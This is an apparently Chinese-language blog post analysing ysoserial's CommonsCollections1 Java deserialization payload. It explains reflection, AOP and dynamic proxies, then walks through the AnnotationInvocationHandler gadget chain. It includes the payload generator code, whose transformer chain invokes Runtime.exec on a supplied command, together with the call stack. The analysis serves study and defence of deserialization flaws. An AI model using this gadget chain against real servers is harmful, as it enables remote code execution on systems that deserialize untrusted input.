---
title: Ysoserial工具解读（一）
date: 2019-10-23 16:31:10
tags: [Java, RCE,反序列化]
categories: 漏洞分析
cover: java_cover.png
---

今天要说的第一个类是`AnnotationInvocationHandler`，主要是CommonsCollections1.java的内容。

<!-- more -->

## 前言

虽然，[ysoserial](https://github.com/frohoff/ysoserial.git)这个工具从发布到现在有3、4年了。但它在构造序列化对象时使用了很多精巧的方法，重读一遍它的代码，对于提升java基础还是很有帮助的。这里计划写一个系列，将该工具所用到的一些类和特殊方法归类总结。如果有网友懒得自己读代码，可以读我写的这些文章。
准确来说，本系列的第一篇文章应该是半年前写的那篇：[Java反序列化漏洞解析](https://l1nf3ng.github.io/2019/03/27/Java反序列化漏洞解析/) 。

## 基础知识

这些基础知识点和后期要分析的payload构造方法息息相关，可以现在就读，也可以在后面碰到了再回头看。

### 反射机制

如上一篇所说，**反射机制**允许程序在运行态时*获取一个类的所有属性和方法，也能调用一个对象的所有方法，还能修改其属性*。具体的`Class`对象的各种方法都请参考上一篇文章，这里贴一下ysoserial这个工具对用到的反射机制的代码封装：

```java
/*全部实现在一个叫Reflections的类中*/
public class Reflections {

    // 获取某个类的某一字段，也就是成员变量；
    // 这里因为使用的getDeclaredField()方法，所以除了父类的字段，别的（private、public、protocted）均能获取到
    // 这一方法被后面两个方法调用
	public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
	    try {
	        field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
		return field;
	}

    // 设置字段值
	public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}

    // 获取字段值
	public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		return field.get(obj);
	}
    
    // 获取声明的第一个构造函数
    public static Constructor<?> getFirstCtor(final String name) throws Exception {
		final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
	    ctor.setAccessible(true);
	    return ctor;
	}

    // 根据构造函数构建实例
	public static Object newInstance(String className, Object ... args) throws Exception {
        return getFirstCtor(className).newInstance(args);
    }
    
    * * * *
```

因为在后面的代码中ysoserial调用了好多这个类的静态方法，就不再一一解释。

### AOP（Aspect Oriented Programming）

因为下面马上要说动态代理，这里插段话，讲讲AOP（面向切面编程），这两者经常互相提及。AOP其实是种设计思想，是OOP的延续。以下来自百度的说法：

>  **AOP**通过*预编译方式*和*运行期动态代理*实现程序功能的统一维护的一种技术， 是函数式编程的一种衍生范型  ， 利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 

这里我在CSDN上找到一篇比较通俗的讲解，简单复读一下：直接举例吧，假设你在以OOP的方式写一个活动奖励发放的业务，第一个版本里你给每个活动（不同种类）创建了一个类，因为每个活动在计算奖励前都要做校验工作（用户是否登录、活动是否有效等），你在写每个类时都copy了一份同样功能的代码（当然，我想现在估计没人这么写代码了）：

![](aop1.png)

然后，在第二版中你将校验功能做了抽象，将它们放在了一个接口中，每个活动类`implements`一下，这样便节省了好多代码。现在已经是一种类似AOP的编程思想了。

![](aop2.png)

我们再将上面的版本抽象，将校验功能抽离出来。将上述过程变为在某个类需要它时将其动态注入。除了以*接口形式*实现，AOP还可以通过*注解*、*XML*形式实现。

![](aop3.png)

### 动态代理

AOP的最大特点就是一种动态注入代码的技术，其底层实现主要基于动态代理技术。常见的动态代理有基于Jdk原生接口的和第三方cglib库的，这里介绍jdk的这种（因为后面payload主要依赖它），另一种的细节可以自行百度。其实，jdk的动态代理最终还是使用反射机制实现。 在实现过程中，需要`java.lang.reflect.InvocationHandler`接口和 `java.lang.reflect.Proxy` 类的支持 。这俩类的定义如下：

```java
// Object proxy:被代理的对象  
// Method method:要调用的方法  
// Object[] args:方法调用时所需要参数  
public interface InvocationHandler {  
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;  
}  

// Proxy类
// CLassLoader loader:类的加载器  
// Class<?> interfaces:得到全部的接口  
// InvocationHandler h:得到InvocationHandler接口的子类的实例  
public static Object newProxyInstance(ClassLoader loader, Class<?>[] interfaces, InvocationHandler h) throws IllegalArgumentException  
```

这里，JDK原生的动态代理设计意图是*对**某个接口**的方法添加一些额外逻辑（类似于Python中的装饰器）*，因此*需要创建该接口的实现类，再对该实现类的实例进行代理*。下面的代码展示了如何创建动态代理，以及通过动态代理可以做什么：

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

interface Client{
    void Login(String name, String password);
}

class Player implements Client{
    private String name;
    public Player(String s){this.name = s;}

    @Override
    public void Login(String name, String password){
        if (name == this.name){
            System.out.println("玩家 "+name+" 已经登录.");
        }
    }
}

class PlayerHandler implements InvocationHandler{

    //被代理的对象
    private Client obj;
    Object result=null;
    //将需要代理的实例通过处理器类的构造方法传递给代理。
    public PlayerHandler (Client obj){
        this.obj = obj;
    }

    public Object invoke(Object proxy, Method method, Object[] args)throws Exception {
        // 在对应的方法调用前、后都可以做修改
        if(method.getName().equals("Login")){
            System.out.println("代理登录游戏！");
            result = method.invoke(this.obj, args);
        }
        return result;
    }
}

public class CheckDynamic {

    public static void main(String[] args)throws Exception{
        Player opl = new Player("sunwukong");
        PlayerHandler handler = new PlayerHandler(opl);
        // 这里只可以转换成接口，而不是其实现类，具体原因可以看参考链接3
        Client ppl = (Client) Proxy.newProxyInstance(
                opl.getClass().getClassLoader(),
                opl.getClass().getInterfaces(),
                handler);
        ppl.Login("sunwukong", "122355");
    }

}
```

在代理对象某方法时，它会先去对应的`InvocationHandler`继承类中调用`invoke()`方法，而在`invoke()`方法中我们修改了原本的实现逻辑。因此，运行结果如下：

```powershell
"C:\Program Files\Java\jdk1.8.0_172\bin\java.exe" ...
代理登录游戏！
玩家 sunwukong 已经登录.

Process finished with exit code 0
```

一般使用JDK原生动态代理的编写模式如下图：

![](proxy.png)

上图中Subject是一个接口，真正的实现类RealSubject和代理类Proxy都实现了这一接口。只不过在使用`Proxy.newProxyInstance()`时不用实际创建代理类；另外，通过`InvocationHandler`接口的`invoke()`方法来修改真实类的方法时要注意：**它只能修改原接口定义过的方法，而无法修改实现类新加的方法**。

## `AnnotationInvocationHandler`类

这个类被用在了CommonsCollections1的Payload中，算是反序列化过程中的第一环。而它的实现正是依靠Jdk动态代理技术，先贴一下生成序列化对象的代码段：

```java
// 依赖于Common-Collections3.1及以前的类
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public InvocationHandler getObject(final String command) throws Exception {
    
    final String[] execArgs = new String[] { command };
    
    // 对ChainedTransformer做初始化，主要是iTransformers字段赋值
    // 但在代码的后半部分又将该字段替换成了真实的攻击链，其实我也不懂眼下这段话的意思
    // 反正你直接拿真实的攻击链初始化ChainedTransformer对象也没问题
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    
    // 真实的攻击链
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer("exec",
                               new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };

    final Map innerMap = new HashMap();

    // decorate是一个LazyMap类的静态方法，其中调用了LazyMap构造函数来初始化
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
	// 创建lazyMap的代理对象
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
	// 创建AnnotationInvacationHandler对象的实例
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
	// 利用反射机制将iTransformers字段替换成真的攻击链
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers); 
    
    return handler;
}
```

关于 `Transformer[] transformers`的分析可以参考上一篇，这里主要关注剩余攻击链的构造：

![](code1.png)

这两个函数的内容如下：

```java
public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
    return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
}

// 这里的ANN_INV_HANDLER_CLASS就是AnnotationInvocationHandler类
public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
    // 利用反射机制创建AnnotationInvocationHandler的实例，并用Override类和map初始化它。
    return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
}


public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
    final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
    allIfaces[ 0 ] = iface;
    if ( ifaces.length > 0 ) {
        System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
    }
    // 创建iface接口实现类的代理对象
    return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
}
```

这段调用看上去有些凌乱，这里用一张图整理一下。因为写代码的人为了方便，他在创建`lazyMap`的代理类后又将它用做`AnnotationHandler`实例的`memberValues`变量值。

![](code2.png)

如上述代码，`createMemoizedInvocationHandler()`创建了一个`AnnotationInvocationHandler`的实例，而它的相关代码如下：

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
	
    // 仅有一个构造函数，以Map<String, Object>作为参数
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        // map被存储在变量memberValues中，在生成payload时map填入的其实是lazyMap的代理类
        this.memberValues = var2;
    }

    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        // 先调用入参var1的默认readObject()方法
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            // 用自己的type参数初始化一个实例并赋值给var2，这里的type是Override.Class
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            return;
        }

        Map var3 = var2.memberTypes();
        // 调用memberValues的entrySet()方法，也就时map的该方法
        Iterator var4 = this.memberValues.entrySet().iterator();

        **** SNIP ****       
    
    
    public Object invoke(Object var1, Method var2, Object[] var3) {
        // var4是被调用方法名
        String var4 = var2.getName();
        // var5是方法参数类型
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else {
            assert var5.length == 0;

            if (var4.equals("toString")) {
                return this.toStringImpl();
            } else if (var4.equals("hashCode")) {
                return this.hashCodeImpl();
            } else if (var4.equals("annotationType")) {
                return this.type;
            } else {
                // entrySet()非以上方法，则调用memberValues的get方法，也就是map的get方法。
                Object var6 = this.memberValues.get(var4);
                
			**** SNIP ****
```

这条攻击链的调用栈就是这个样子：恶意的序列化对象传给服务器→预定的对象`readObject()`→`AnnotationInvocationHandler`的`readObject()`→`this.memberValues`的`entrySet()`方法（也就是`lazyMap`代理类的`entrySet()`方法）→去对应的`InvocationHandler`执行`invoke()`方法→调用`lazyMap`的`get()`方法→接入后续的攻击链，造成RCE。正如CommonsCollections1.java注释中写的：

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections3.1
 */
```

实际中在模拟服务端代码调试时打印的调用栈正如以上分析：


```powershell
"C:\Program Files\Java\jdk1.7.0_01\bin\java.exe" ...
Connected to the target VM, address: '127.0.0.1:2922', transport: 'socket'
Disconnected from the target VM, address: '127.0.0.1:2922', transport: 'socket'
Exception in thread "main" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set
	at $Proxy0.entrySet(Unknown Source)
	at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:346)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:601)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:991)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1866)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1771)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1347)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:369)
	at NormalHandler.main(NormalHandler.java:51)

Process finished with exit code 1
```
## References:

1. [ https://www.cnblogs.com/Welk1n/p/10511145.html ]()
2.   https://blog.csdn.net/q982151756/article/details/80513340 
3.  https://www.cnblogs.com/kundeg/p/7942030.html 
4.  [http://www.vuln.cn/6295 ]()

